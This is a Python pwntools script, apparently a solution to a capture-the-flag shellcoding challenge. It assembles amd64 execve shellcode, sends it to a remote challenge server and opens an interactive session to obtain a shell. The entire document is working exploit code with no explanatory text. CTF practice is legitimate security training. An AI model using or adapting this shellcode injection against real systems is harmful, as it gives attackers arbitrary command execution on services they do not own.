from pwn import *
context.arch = 'amd64'



payload = asm("push 0;pop rsi;push 0;pop rdx;push 0x3b;pop rax;lea rdi,[rsp+8];syscall")
print len(payload)


#p = process('./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d')
p = remote('chal.ctf.b01lers.com',1007)
p.recvuntil('walk through it.\n')

# gdb.attach(p)
p.sendline(payload)


p.interactive()